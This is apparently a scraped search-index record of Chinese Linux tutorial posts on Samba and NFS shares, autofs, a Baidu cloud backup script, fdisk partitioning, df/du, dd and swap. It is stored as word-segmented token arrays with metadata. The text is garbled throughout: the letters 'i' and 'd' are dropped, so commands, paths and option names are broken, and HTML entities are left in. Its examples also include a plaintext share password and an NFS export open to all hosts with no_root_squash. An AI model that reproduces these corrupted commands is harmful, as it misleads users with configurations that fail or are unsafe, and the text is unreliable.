,"“","所有人","可见","”","wrtable","=","yes","#","允许","写入","操作","配置","命令","PbetSamba","服务","程序","默认","使用","的","是","用户","口令","认证","模式","（","user","）","。","这种","认证","模式","可以","确保","仅","让","有","密码","且","受","信任","的","用户","访问","共享资源","，","而且","验证","过程","也","十分","简单","。","不过","，","只有","建立","账户","信息","数据库","之后","，","才能","使用","用户","口令","认证","模式","。","另外","，","Samba","服务","程序","的","数据库","要求","账户","必须","在","当前","系统","中","已经","存在","，","否则","日后","创建","文件","时","将","导致","文件","的","权限","属性","混乱","不堪","，","由此","引发","错误","。","pbet","命令","用于","管理","SMB","服务","程序","的","账户","信息","数据库","。","常用","参数","含义","pbet","-","a","username","新建","Samba","账户","。","pbet","-","r","username","修改","Samba","账户","。","pbet","-","x","username","删除","Samba","账户","pbet","-","L","列出","Samba","用户","列表","，","读取","passb",".","tb","数据库文件","。","报","错","：","Fale","to","a","entry","for","user","qwer","，","是","因为","没有","添加","本地","账户","。","Semanagesemanage","命令","是","用来","查询","与","修改","SELnux","默认","目录","的","安全","上下文","。","详情","：","https",":","pcmen",".","comsemanage","semanage","含义","semanage","-","l","查询","semanage","fcontext","主要","用","在","安全","上下文","方面","semanage","-","a","增加","，","你","可以","增加","一些","目录","的","默认","安全","上下文","类型","设置","semanage","-","m","修改","semanage","-","删除","SELnux","安全","上下文","详情","：","http",":","c",".","bancheng",".","netew","1151",".","html","chcon","和","restorecon","命令","，","如果","一个","文件","的","安全","上下文","和","它","默认","的","不","匹配","的话","，","一般情况","会","导致","没有","权限","访问","这个","文件","，","这是","Selnux","的","一种","功能","。","restorecon","：","把","文件","的","安全","上下文","恢复","成","默认","的","安全","上下文","。","restorecon","[","选项","】","文件","或","目录","-","R","：","递归",".","当前","目录","和","目录","下","所","有的","子","文件","同时","恢复","；","-","V","：","把","恢复","过程","显示","到","屏幕","上","；","Samba","配置","yum","-","y","nstall","samba","#","添加","用户","usera","nk","#","pbet","是","samba","的","用户","管理","命令","，","这里","需要","手动","输入","密码","pbet","-","a","-","u","nk","#","new","passwor",":","monan","#","retype","new","passwor",":","monanmkr","homeatabasechown","-","Rf","nk",":","nk","homeatabase","#","这里","如果","SELINUX","关闭","的话","，","下面","几","行","关于","安全","上下文","的","命令","可以","不用","敲","#","安装","semanageyum","-","y","nstall","polcycoreutls","-","python",".","x","86","_","64","#","增加","一条","关于","samba","的","安全","上下文","semanage","fcontext","-","a","-","t","samba","_","share","_","t","homeatabase","#","将","homeatabase","的","安全","上下文","回复","restorecon","-","R","homeatabaserestorecon","reset","homeatabase","context","unconfne","_","u",":","object","_","r",":","home","_","root","_","t",":","s","0","-","unconfne","_","u",":","object","_","r",":","samba","_","share","_","t",":","s","0","etcsambasmb",".","confcat","etcsambasmb",".","conf","EOF","[","global","]","workgroup","=","MYGROUPserer","strng","=","Samba","Serer","Verson","%","log","fle","=","arlogsambalog",".","%","mmax","log","sze","=","50","securty","=","userpassb","backen","=","tbsamloa","prnters","=","yescups","optons","=","raw","[","atabase","]","comment","=","Do","not","arbtrarly","mofy","the","atabase","flepath","=","homeatabasepublc","=","nowrtable","=","yesEOF","systemctl","restart","smbsystemctl","enable","smb","挂载","SambaWnows","需要","进行","登录","，","登录","用户","名为","nk","，","密码","为","monan","Lnux","yum","nstall","cfs","-","utlsmkr","atabasecat","rootauth",".","smb","EOFusername","=","nkpasswor","=","monanoman","=","MYGROUPEOFcat","etcfstab","EOF","192.168.10.10","atabase","atabase","cfs","creentals","=","rootauth",".","smb","0","0","EOFmount","-","a","3","、","NFS","服务","配置","文件","参数","NFS","的","配置","文件","在","etcexports","中","，","其","基本","格式","为","：","挂在","文件","目录","允许","访问","的","IP","地址","(","权限","相关",")","注意","NFS","客户端","地址","与","权限","之间","没有","空格","。","参数","含义","ro","只读","rw","读写","root","_","squash","当","NFS","客户端","以","root","管理员","访问","时","，","映射","为","NFS","服务器","的","匿名","用户","no","_","root","_","squash","当","NFS","客户端","以","root","管理员","访问","时","，","映射","为","NFS","服务器","的","root","管理员","all","_","squash","无论","NFS","客户端","使用","什么","账户","访问","，","均","映射","为","NFS","服务器","的","匿名","用户","sync","同时","将","数据","写入","到","内存","与","硬盘","中","，","保证","不","丢失","数据","async","优先","将","数据","保存","到","内存","，","然后","再","写入","硬盘","；","这样","效率","更高","，","但","可能会","丢失","数据","​","NFS","相关","包","nfs","-","utls",":","NFS","主要","组件","，","包含","rpc","、","nfs","、","和","rpc",".","mount","这","两个","守护","进程","nfsbn","：","提供","rpc","端口","映射","的","守护","进程","exportfs","：","在","NFS","服务器","，","维护","nfs","共享","资源","的","命令","showmount","：","用来","查看","nfs","客户端","的","资源","共享","目录","nfsstat","：","显示","nfs","状态","信息","rpcnfo","：","显示","由","rpc","启动","服务","systemctl","start","rpcbn","&","amp",";","&","amp",";","systemctl","start","nfs","-","serer","软件包","：","nfs","-","utls","服务","类型","：","由","system","启动","的","守护","进程","配置","单元","：","usrlbsystemsystemnfs",".","serce","守护","进程","：","rpc",".","nfs","rpc",".","mount","端口","号","：","2049","nfs","111","rpcbn","20048","mount","服务端","配置","：","etcexports","相关","软件包","：","rpcbn","服务端","配置","yum","-","y","nstall","nfs","-","utlsmkr","nfschmo","-","Rf","777","nfsecho","\"","Ths","s","NFS","\"","nfsnfs",".","txtcat","etcexports","EOFnfs","*","(","rw",",","sync",",","no","_","root","_","squash",")","EOFsystemctl","restart","rpcbnsystemctl","restart","nfs","-","serer",".","serce","如果","wnows","下","连接","报","网络","错误","53","的话","，","可能","是","以下","情况","：","NFS","服务器","有","一个","”","在","非","安","全","模式","工作","（","允许","更高","的","端口","号","）","“","的","选项","。","Wnows","NFS","客户端","经常","使用","的","是","大的","端口","号","。","你","可以","在","你","的","共享","项","设置","中","开启","这个","选项","例如","：","share","*","(","nsecure",",","rw",")","客户端","配置","Wnows","控制","面板","-","-","-","-","程序","-","-","-","-","程序","和","功能","：","wn","+","r","-","-","-","cm","-","-","-","挂在","文件","管理器","Lnux","[","root@lnuxprobe","~","]","#","showmount","-","e","192.168.10.10","Export","lst","for","192.168.10.10",":","nfsfle","192.168.10",".","*","[","root@lnuxprobe","~","]","#","mkr","nfsfle","[","root@lnuxprobe","~","]","#","mount","-","t","nfs","192.168.10.10",":","nfsfle","nfsfle","#","想要","长期","挂在","，","可以","编辑","etcfstab","文件","showmount","参数","作用","-","e","显示","NFS","服务器","的","共享","列表","-","a","显示","本","机挂载","的","文件","资源","的","情况","NFS","资源","的","情况","​","自动","挂载​","与","mount","命令","不同","，","autofs","服务","程序","是","一种","Lnux","系统","守护","进程","，","当","检测","到","用户","试图","访问","一个","尚未","挂载","的","文件系统","时","，","将","自动","挂载","该","文件系统","。","换句话说","，","我们","将","挂载","信息","填","入","etcfstab","文件","后","，","系统","在","每次","开机","时","都","自动","将","其","挂载","，","而","autofs","服务","程序","则","是","在","用户","需要","使用","该","文件系统","时","才","去","动态","挂载","，","从而","节约了","网络资源","和","服务器","的","硬件","资源","。","yum","-","y","nstall","nfs","-","utlsyum","-","y","nstall","autofsshowmount","-","e","192.168.19.132","mkr","mynfs","#","配置","文件格式","：","【","挂载","目录","】","【","子","配置","文件","】","echo","\"","mynfs","etcnfs",".","msc","\"","etcauto",".","master","#","子","配置","文件格式","：","【","挂载","目录","】","【","挂","载文","件","类型","及","权限","】",":","【","设备","名称","】","#","比如","：","so","-","fstype","=","so","9660",",","ro",",","nosu",",","noe",":","ecrom","#","权限","详情","参见","挂载","时文","件","权限","echo","\"","name","1","-","fstype","=","nfs","192.168.19.132",":","nfs","\"","etcnfs",".","mscsystemctl","restart","autofsc","mynfsname","1","备份","百度","云","#","!","bnbash","#","自动","备份","百度","云","文件","#","2020416","Python","2.7","#","#","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","安装","依赖","#","pp","nstall","requests","#","pp","nstall","bypy","#","#","[","root@localhost","~","]","#","bypy","nfo","#","Please","st",":","#","访问","下边","这个","连接","，","复制","授权","码","#","https",":","openap",".","bau",".","comoauth","2.0","authorze","?","scope","=","basc","+","netsk","&","amp",";","rerect","_","ur","=","oob","&","amp",";","response","_","type","=","coe","&","amp",";","clent","_","=","q","8","WE","4","EpCsau","1","oS","0","MplgMKNBn","#","An","authorze","ths","app","#","Paste","the","Authorzaton","Coe","here","wthn","10","mnutes",".","#","Press","[","Enter","]","when","you","are","one","#","提示","在","下边","粘贴","授权","码","#","a","288","f","3775","fa","905","a","6911692","a","0808","f","6","a","8","#","Authorzng",",","please","be","patent",",","t","may","take","upto","None","secons",".",".",".","#","Authorzngrefreshng","wth","the","OpenShft","serer",".",".",".","#","OpenShft","serer","fale",",","authorzngrefreshng","wth","the","Heroku","serer",".",".",".","#","Successfully","authorze","#","Quota",":","2.015","TB","#","Use",":","740.493","GB","#","由于","百度","PCS","API","权限","限制","，","程序","只能","存取","百度","云端","appsbypy","目录","下面","的","文件","和","目录","。","我们","可以","通过","：","#","[","root@localhost","~","]","#","bypy","lst","#","appsbypy","(","$","t","$","f","$","s","$","m","$",")",":","#","#","把","本地","当前","目录","下","的","文件","同步","到","百度","云盘","：","#","bypy","uploa","#","#","把","云盘","上","的","内容","同步","到","本地",":","#","bypy","ownr","#","#","比较","本地","当前","目录","和","云盘","根目录","，","看","是否","一致","，","来","判断","是否","同步","成功","：","#","bypy","compare","#","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","#","BaDuDS","就是","我们","备份","百度","云","的","本地","目录","#","创建","一个","文件","，","用于","存放","上","一次","测量","的","Bauyun","备份","大小","。","如果","这次","测量","后","大小","相同","，","说明","没有","上传","文件","，","不需要","备份","touch","tmpszesze","_","now","=","`","u","-","sh","BaDuDS","awk","-","F","'","'","'","&","#","123",";","prnt","$","1","&","#","125",";","'","`","sze","_","before","=","`","cat","tmpsze","`","f","[","\"","$","sze","_","now","\"","=","\"","$","sze","_","before","\"","]",";","then","echo","\"","Fle","Hasn","'","t","Change","\"","else","echo","\"","Fle","Has","Change",",","Upate","tmpsze",".",".","\"","echo","\"","$","sze","_","now","\"","tmpsze","echo","\"","BackUp","to","BauDuYun","\"","#","同步","文件夹","到","远端","bypy","ownrf"],"url":"http://ymlog.cn/2020/01/16/Linux%E7%BD%91%E7%BB%9C%E5%AD%98%E5%82%A8/","title":"Linux网络存储","content":"1、FTP服务FTP（File Transfer Protocol）文件传输协议，主要功能是在服务器与客户端之间进行文件的传输。FTP协议使用明码传输，为了使用更安全的FTP协议，可以采用vsftpd（Very Secure Ftp ...","author":"ZEN","categorie":{"url":"http://ymlog.cn/categories/Linux/","name":"Linux"},"date":"2020-01-16 19:36:23"},{"word":["磁盘","管理","磁盘","设备","根据","接口","进行","命名","，","IDE","接口","的","，","以","eh","的","形式","命名","。","而","SCSI","、","SATA","、","SAS","、","USB","接口","的","，","以","sa",",","sb",",","sc","的","形式","命名","，","不同的","设备","划分","的","名字","从","a","-","z","。","IDE","的","英文","全","称为","“","Integrate","Dre","Electroncs","”","，","即","“","电子","集成","驱动器","”","，","它","的","本意","是","指","把","“","硬盘","控制器","”","与","“","盘体","”","集成","在一起","的","硬盘驱动器",",","这种","类型","的","接口","随着","接口","技术","的","发展","已经","被","淘汰","了","，","而","其后","发展","分支","出","更多","类型","的","硬盘","接口","，","比如","ATA","、","Ultra","ATA","、","DMA","、","Ultra","DMA","等","接口","都","属于","IDE","硬盘","。","以上","是","传统","的","并行","ATA","传输","方式","，","后来","又","出现","了","串行","ATA","（","Seral","ATA","，","简称","SATA","）","，","其","最大","数据传输","率","更进一步","提高","到了","150","MBsec","。","SATA","的","全称","是","Seral","Aance","Technology","Attachment","，","是","由","Intel","、","IBM","、","Dell","、","APT","、","Maxtor","和","seagate","公司","共同","提出","的","硬盘","接口","规范","。","SATA","规范","将","硬盘","的","外部","传输","速率","理论值","提高","到了","150","MBs","。","SATA","的","优势","：","支持","热","插","拔","，","传输","速度","快","，","执行","效率","高","。","SATA","接口","需要","硬件","芯片","的","支持","，","例如","Intel","ICH","5","(","R",")","、","VIA","VT","8237","、","nVIDIA","的","MCP","RAID","和","SS","964","，","如果","主板","南桥","芯片","不能","直接","支持","的话","，","就","需要","选择","第三方","的","芯片","，","例如","SlconImage","3112","A","芯片","等","，","不过","这样","也","就","会","产生","一些","硬件","性能","的","差异","，","并且","驱动","程序","也","比较","繁杂","。","更多","接口","知识","：","https",":","www",".","cnblogs",".","comLnuxSuDap","4513996",".","html","两种","分区","部","分文","件","摘录","于","：","https",":","blog",".","csn",".","netefhgyjartcleetals","91174541","对于","同一块","硬盘","，","又","可以","有","不同的","分区","，","分区","的","划分","以","数字","命名","，","如","：","sb","1",",","sb","2",",","sb","3","。","分区","的","方式","有","：","MBR","分区","和","GPT","分区","。","MBR","分区","​","MBR","的","意思","是","“","主","引导","记录","”","，","是","IBM","公司","早年","间","提出","的","。","它是","存在","于","磁盘驱动器","开始","部分","的","一个","特殊的","启动","扇区","。","这个","扇区","包含","了","已","安装","的","操作系统","系统","信息","，","并用","一","小段","代码","来","启动","系统","。","如果","你","安装","了","Wnows","，","其","启动","信息","就","放","在","这","一段","代码","中","—","—","如果","MBR","的","信息","损坏","或","误删","就","不能","正常","启动","Wnows","，","这时候","你","就","需要","找","一个","引导","修复","软件","工具","来","修复","它","就","可以","了","。","Lnux","系统","中","MBR","通常","会","是","GRUB","加载","器","。","MBR","。","当","一台","电脑","启动","时","，","它","会","先","启动","主板","自","带","的","BIOS","系统","，","bos","加载","MBR","，","MBR","再","启动","Wnows","，","这","就是","mbr","的","启动","过程","。","GPT","分区","GPT","的","意思","是","GUID","Partton","Table","，","即","“","全局","唯一","标识","磁盘","分区表","”","。","他是","另外","一种","更加","先进","新颖的","磁盘","组织","方式","，","一种","使用","UEFI","启动","的","磁盘","组织","方式","。","最","开始","是","为了","更好","的","兼容性","，","后来","因为","其","更大","的","支持","内存","（","mbr","分区","最多","支持","2","T","的","磁盘","）","，","更多","的","兼容","而","被","广泛","使用","，","特别","是","苹果","的","MAC","系统","全部","使用","gpt","分区","。","gtp","不在","有","分区","的","概念","，","所有","CDEF","盘","都","在","一段","信息","中","存储","。","可以","简单的","理解","为","更","先进","但是","使用","不够","广泛的","技术","。","两者","之间","的","区别","因为","兼容","问题","，","gpt","其","实在","引导","的","最","开始","部分","也","有","一段","MBR","引导","，","也","叫做","“","保护","引导","”","，","为了","防止","设备","不支持","UEFI","1","、","MBR","最多","支持","2","T","，","而","GPT","理论上","是","无限制","的","。","2","、","MBR","最多","支持","四个","主","分区","，","GPT","没有","限制","。","如果","你想","跑多","系统","，","MBR","最多","4个","而","GPT","没有","限制","。","3","、","wn","7","只","能用","MBR","分区","，","从","Wn","8","开始","微软","建议","你","使用","GPT","。","4","、","GPT","是","由","UEFI","启动","的","，","而","UEFI","是","后来","才","提出","的","概念","，","兼容性","和","稳定性","不如","BIOS","+","MBR","。","Wnows","系统","分区","最先","出现","在","Wnows","8","中","设置","新","磁盘","，","系统","会","询问","你","是","想要","使用","MBR","还","是","GPT","分区","，","GPT","是","一种","新的","硬盘分区","标准","。","GPT","带来","了","很多","新","特性","，","最大","支持","18","EB","的","大","容量","（","EB","=","1024","PB","，","PB","=","1024","TB","）","；","MBR","最大","只","支持","2","TB","，","但","拥有","最好","的","兼容性","。","MBR","（","Master","Boot","Recor","）","分区","：","MBR","的","意思","是","“","主","引导","记录","”","，","它","有","自己","的","启动器","，","也就是","启动","代码","，","一旦","启动","代码","被","破坏","，","系统","就","没法","启动","，","只有","通过","修复","才能","启动","系统","。","最大","支持","2","TB","容量","，","在","容量","方面","存在","着","极大","的","瓶颈","，","那么","GPT","在","今后","的","发展","就","会","越来越","占优势","，","MBR","也","会","逐渐","被","GPT","取代","。","GPT","（","GUID","Partton","Table","）","分区","：","GPT","意","为","GUID","分区表","，","这是","一个","正","逐渐","取代","MBR","的","新标准","，","它","由","UEFI","辅助","而","形成","的","，","这样","就","有了","UEFI","用于","取代","老","旧的","BIOS","，","而","GPT","则","取代","老","旧的","MBR","。","这个","标准","没有","MBR","的","那些","限制","。","磁盘驱动器","容量","可以","大","得多","，","大","到","操作系统","和","文件系统","都","没法","支持","。","它","同时","还","支持","几乎","无限","个","分区","数量","，","限制","只","在于","操作系统","，","Wnows","支持","最多","128个","GPT","分区","。","通过","UEFI","，","所有","的","64位","的","wn","10","，","wn","8","，","wn","7","和","Vsta","，","以及","所","对应","的","服务器","都","能","从","GPT","启动","有","区别","，","GPT","和","MBR","是","不同的","分区表","类型","。","使用","MBR","分区表","的","硬盘","最多","只能","划分","4个","主","分区","磁盘","，","并且","MBR","最大","仅","支持","2","TB","的","硬盘","。","如果","需要","分区","的","硬盘容量","超过","2","TB","了","，","则","需要","使用","GPT","分区表","类型","，","此","分区表","类型","不受","分区","个数","、","硬盘","大小","的","限制","。","UEFI","，","全称","Unfe","Extensble","Frmware","Interface","，","即","“","统一","的","可","扩展","固","件","接口","”","，","是","一种","详细","描述","全新","类型","接口","的","标准","，","是","适用","于","电脑","的","标准","固","件","接口","，","旨在","代替","BIOS","（","基本","输入输出","系统","）","。","此","标准","由","UEFI","联盟","中的","140","多","个","技术","公司","共同","创建","，","其中","包括","微软公司","。","UEFI","旨在","提高","软件","互","操作性","和","解决","BIOS","的","局限性","。","要","详细","了解","UEFI","，","还","得","从","BIOS","讲起","。","我们","都","知道","，","每一台","普通的","电脑","都会","有","一个","BIOS","，","用于","加载","电脑","最","基本的","程式","码","，","担负","着","初始化","硬件","，","检测","硬件","功能","以及","引导","操作系统","的","任务","。","UEFI","就是","与","BIOS","相对","的","概念","，","这种","接口","用于","操作系统","自动","从","预","启动","的","操作","环境","，","加载","到","一种","操作系统","上","，","从而","达到","开机","程序化","繁","为","简","节省","时间","的","目的","。","传统","BIOS","技术","正在","逐步","被","UEFI","取而代之","，","在","最近","新","出厂","的","电脑","中","，","很多","已经","使用","UEFI","，","使用","UEFI","模式","安装","操作系统","是","趋势","所在","。","总结","UEFI","是","新式","的","BIOS","，","legacy","是","传统","BIOS","。","你","在","UEFI","模式","下","安装","的","系统","，","只","能用","UEFI","模式","引导","；","同理","，","如果","你","是","在","Legacy","模式","下","安装","的","系统","，","也","只","能","在","legacy","模式","下","进","系统","。","UEFI","只","支持","64","为","系统","且","磁盘分区","必须","为","GPT","模式","，","传统","BIOS","使用","INT","13","中断","读取","磁盘","，","每次","只","能","读","64","KB","，","非常","低效","，","而","UEFI","每次","可以","读","1","MB","，","载入","更","快","。","此外","，","Wn","8","，","更是","进一步","优化","了","UEFI","支持","，","号称","可以","实现","瞬时","开机","。","磁盘分区","#","选择","一块","需要","划","分区","的","磁盘","[","root@localhost","~","]","#","fsk","esb","#","或者","查看","磁盘","里面","的","分区","[","root@noe1","~","]","#","fsk","esb","-","lDsk","esb",":","21.5","GB",",","21474836480","bytes",",","41943040","sectorsUnts","=","sectors","of","1","*","512","=","512","bytesSector","sze","(","logcalphyscal",")",":","512","bytes","512","bytesIO","sze","(","mnmumoptmal",")",":","512","bytes","512","bytesDsk","label","type",":","osDsk","entfer",":","0","x","6","b","7","b","90","b","Dece","Boot","Start","En","Blocks","I","Systemesb","1","2048","10487807","5242880","8","e","Lnux","LVMesb","2","10487808","41943039","15727616","8","e","Lnux","LVM","[","root@noe1","~","]","#","#","查看","内核","当中","是否","识别","新的","分区","[","root@localhost","~","]","#","cat","procparttons","#","通知","内核","重新","读取","磁盘分区","[","root@localhost","~","]","#","partx","-","a","esb","1","partx",":","esb",":","error","ang","partton","1","#","或者","是","：","[","root@localhost","~","]","#","partprobe","esb","1","#","上面","那个","是","识别","分区","的","，","下面","这个","是","识别","磁盘","的","。","#","执行","如下","命令","扫描","磁盘",":","echo","\"","-","-","-","\"","sysclassscs","_","hosthost","0","scan","#","查看","内核","分区","[","root@noe1","~","]","#","cat","procparttons","分区","管理","的","子","命令","Comman","(","m","for","help",")",":","mComman","acton","a","toggle","a","bootable","flag","b","et","bs","sklabel","c","toggle","the","os","compatblty","flag","删除","分区","g","create","a","new","empty","GPT","partton","table","G","create","an","IRIX","(","SGI",")","partton","table","l","列出","已知","分区","类型","m","打印","帮助","菜单","n","添加","一个","新","分区","o","create","a","new","empty","DOS","partton","table","p","打印","分区表","q","不","保存","退出","s","create","a","new","empty","Sun","sklabel","t","改变","分区","系统","的","ID","（","类型","）","u","change","splayentry","unts","erfy","the","partton","table","w","保存","修改","并","退出","x","extra","functonalty","(","experts","only",")","新建","分区","：","Comman","(","m","for","help",")",":","nPartton","type",":","p","prmary","(","1","prmary",",","0","extene",",","3","free",")","e","exteneSelect","(","efault","p",")",":","p","#","选择","主","分区","Partton","number","(","2","-","4",",","efault","2",")",":","2","#","一个","有","四个","主","分区","，","一个","扩展","分区","，","扩展","分区","可以","用来","分","逻辑","分区","Frst","sector","(","10487808","-","41943039",",","efault","10487808",")",":","Usng","efault","alue","10487808","#","分","1个","G","给","这个","分区","Last","sector",",","+","sectors","or","+","sze","&","#","123",";","K",",","M",",","G","&","#","125",";","(","10487808","-","41943039",",","efault","41943039",")",":","+","1","G","Partton","2","of","type","Lnux","an","of","sze","1","GB","s","setComman","(","m","for","help",")",":","p","#","查看","当前","分区表","Dsk","&","#","x","2","F",";","e","&","#","x","2","F",";","s",":","21.5","GB",",","21474836480","bytes",",","41943040","sectorsUnts","&","#","x","3","D",";","sectors","of","1","*","512","&","#","x","3","D",";","512","bytesSector","sze","(","logcal","&","#","x","2","F",";","physcal",")",":","512","bytes","&","#","x","2","F",";","512","bytesI","&","#","x","2","F",";","O","sze","(","mnmum","&","#","x","2","F",";","optmal",")",":","512","bytes","&","#","x","2","F",";","512","bytesDsk","label","type",":","osDsk","entfer",":","0","x","8809","f","989","Dece","Boot","Start","En","Blocks","I","System","&","#","x","2","F",";","e","&","#","x","2","F",";","s","1","2048","10487807","5242880","8","e","Lnux","LVM","&","#","x","2","F",";","e","&","#","x","2","F",";","s","2","10487808","12584959","1048576","83","Lnux","删除","分区","Comman","(","m","for","help",")",":","Partton","number","(","1",",","2",",","efault","2",")",":","Partton","2","s","eleteComman","(","m","for","help",")",":","pDsk","es",":","21.5","GB",",","21474836480","bytes",",","41943040","sectorsUnts","=","sectors","of","1","*","512","=","512","bytesSector","sze","(","logcalphyscal",")",":","512","bytes","512","bytesIO","sze","(","mnmumoptmal",")",":","512","bytes","512","bytesDsk","label","type",":","osDsk","entfer",":","0","x","8809","f","989","Dece","Boot","Start","En","Blocks","I","Systemes","1","2048","10487807","5242880","8","e","Lnux","LVM","改变","分区","的","格式","Comman","(","m","for","help",")",":","l","#","列出","当前","分区","的","所有","格式","0","Empty","24","NEC","DOS","81","Mnx","ol","Ln","bf","Solars","1","FAT","12","27","Hen","NTFS","Wn","82","Lnux","swap","So","c","1","DRDOSsec","(","FAT","-","2","XENIX","root","39","Plan","9","83","Lnux","c","4","DRDOSsec","(","FAT","-","3","XENIX","usr","3","c","ParttonMagc","84","OS","2","hen","C",":","c","6","DRDOSsec","(","FAT","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","，","，","，","，","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","1","c","Hen","W","95","FAT","3","75","PCIX","be","Solars","boot","ff","BBT","Comman","(","m","for","help",")",":","t","#","改变","分区","Selecte","partton","1","Hex","coe","(","type","L","to","lst","all","coes",")",":","ff","#","选择","system","Change","type","of","partton","'","Lnux","LVM","'","to","'","BBT","'","Comman","(","m","for","help",")",":","p","Dece","Boot","Start","En","Blocks","I","Systemes","1","2048","10487807","5242880","ff","BBT","当","为","磁盘","分","好","分区","之后","，","就要","用","合适的","文件系统","格式化","这个","分区","，","便于","对","这","块","磁盘","进行","文件","存储","等","操作","。","f","命令","u","和","f","的","区别","？","u","，","sk","usage",",","是","通过","搜索","文件","来","计算","每个","文件","的","大小","然后","累加","，","u","能","看到","的","文件","只是","一些","当前","存在","的","，","没有","被","删除","的","。","他","计算","的","大小","就是","当前","他","认为","存在","的","所有","文件大小","的","累加","和","。","f","，","sk","free","，","通过","文件系统","来","快速","获取","空间","大小","的","信息","，","当","我们","删除","一个","文件","的","时候","，","这个","文件","不","是","马上","就","在","文件系统","当中","消失","了","，","而是","暂时","消失","了","，","当","所有","程序","都","不","用时","，","才","会","根据","OS","的","规则","释放","掉","已","经","删除","的","文件","，","f","记录","的","是","通过","文件系统","获取","到","的","文件","的","大小","，","他","比","u","强的","地方","就是","能够","看到","已经","删除","的","文件","，","而且","计算","大小","的","时候","，","把","这","一部分","的","空间","也","加","上了","，","更","精确了","。","当","文件系统","也","确定","删除","了","该","文件","后","，","这时候","u","与","f","就","一致","了","。","u","查看","目录","大小","，","f","查看","磁盘","使用","情况","。","参数","含义","-","a","显示","全部","的","档案","系统","和","各","分割","区","的","磁盘","使用","情形","-","显示","-","noes","的","使用","量","-","k","大小","用","k","来","表示","(","默认值",")","-","t","显示","某一个","档案","系统","的","所有","分割","区","磁盘","使用","量","-","x","显示","不是","某一个","档案","系统","的","所有","分割","区","磁盘","使用","量","-","T","显示","每个","分割","区","所属","的","档案","系统","名称","-","H","人性化","输出","，","换算","关系","是","1000","，","而不是","1024","查看","块","使用","情况","[","root@localhost","~","]","#","f","-","hFlesystem","Sze","Use","Aal","Use","%","Mounte","onemappercentos","-","root","17","G","2.3","G","15","G","13%","etmpfs","899","M","0","899","M","0%","etmpfs","910","M","0","910","M","0%","eshmtmpfs","910","M","9.4","M","901","M","2%","runtmpfs","910","M","0","910","M","0%","sysfscgroupesa","1","1014","M","190","M","825","M","19%","boottmpfs","182","M","0","182","M","0%","runuser","0","esb","1","2.0","G","6.0","M","1.8","G","1%","rootm","_","test","查看","Inoe","使用","情况","[","root@noe1","test","]","#","f","-","Flesystem","Inoes","IUse","IFree","IUse","%","Mounte","onetmpfs","121503","368","121135","1%","etmpfs","124468","1","124467","1%","eshmtmpfs","124468","720","123748","1%","runtmpfs","124468","16","124452","1%","sysfscgroupemappercentos","-","root","8910848","37480","8873368","1%","esa","1","524288","334","523954","1%","boottmpfs","124468","1","124467","1%","runuser","0","esb","2","10240","4","10236","1%","roottest","u","命令","查看","某","目录","总体","空间","占","比","[","root@localhost","~","]","#","u","-","sh","*","157","M","boot","35","M","etc","76","K","home","-","h",",","-","-","human","-","reaable","prnt","szes","n","human","reaable","format","(","e",".","g",".",",","1","K","234","M","2","G",")","-","-","noes","lst","noe","usage","nformaton","nstea","of","block","usage","-","L",",","-","-","ereference","取消","所有","引用","符号","链接","-","s",",","-","-","summarze","不","显示","每一级","目录","下","每一级","文件夹","的","占用","空间","，","只","显示","当前","目录","命令","f","=","ezero","of","=","enull","&","amp",";","pf","是","源","of","是","目的","ezero","：","吐","零","机","enull","：","数据","黑洞","bs","=","#","指定","复制","单元","大小","count","=","#","指定","多少","个","bs","磁盘","拷贝","f","=","esa","of","=","esb","将","esa","文件","中的","东西","复制","到","esb","中","两个","参数","enull","-","-","黑洞","ezero","-","-","写","0","文件系统","概述","Unx","文件系统","：","FFS","、","UFS","、","JFS","2","网络","文件系统","：","NFS","、","CIFS","集群","文件系统","：","GFS","2","、","OCF","2","分布式","文件系统","：","ceph","、","Glusterfs","、","moosefsLnux","文件系统",":","ext","3",",","ext","4",",","xfs","分类","：","是否","支持","journal","功能","：","日志","型","文件系统","：","ext","3","、","4","、","xfs",".",".",".","非","日志","型","文件系统","：","ext","2","、","fat","文件系统","的","组成","部分","：","内核","中的","模块","：","ext","4","、","xfs","、","fat","用户","空间","的","管理工具","：","mkfs","、","ext","4","、","xfs","、","fatLnux","虚拟","文件系统","：","VFS","格式化","磁盘分区","用","不同的","文件系统","格式化","磁盘分区","比如","：","将","esb","1","这个","分区","用","ext","4","文件系统","格式","[","root@localhost","~","]","#","mkfs",".","ext","4","esb","1","#","一下","两种","方式","是","等价","的","mkfs",".","ext","4","eDEVICE","=","=","mkfs","-","t","ext","4","eDEVICE","#","其","中","FS","_","TYPE","是","磁盘","格式","，","可","以","是","：","ext","4","xfs","btrfs","fat","等","swap","交换","分区","#","将","esb","1","分区","以","swap","形式","格式化","[","root@noe1","~","]","#","mkswap","es","1","mkswap",":","es","1",":","warnng",":","wpng","ol","LVM","2","_","member","sgnature",".","Settng","up","swapspace","erson","1",",","sze","=","5242876","KBno","label",",","UUID","=","14","f","926","a","-","fac","0","-","490","b","-","9162","-","b","00","ccf","8","c","7797","#","查看","当前","系统","内存","使用","情况","，","包括","物理","内存","、","交换","内存","和","内核","缓冲","内","训","[","root@noe1","~","]","#","free","-","m","total","use","free","share","buffcache","aalableMem",":","972","233","486","7","252","584","Swap",":","2047","0","2047","#","将","格式化","好的","交换","分区","添加","到","交换","内存","中","[","root@noe1","~","]","#","swapon","es","1","[","root@noe1","~","]","#","free","-","m","total","use","free","share","buffcache","aalableMem",":","972","237","482","7","252","580","Swap",":","7167","0","7167","free","-","m","-","g","-","m","以","MB","为","单位","-","g","以","GB","为","单位","#","临时","关闭","交换","分区","swapoff","esb","1","以上","创建","挂载","swap","分区","只是","临时","有效","，","要想","设备","重","启","后","依然","生效","，","要","将","相关","信息","写入","到","etcfstab","配置","文件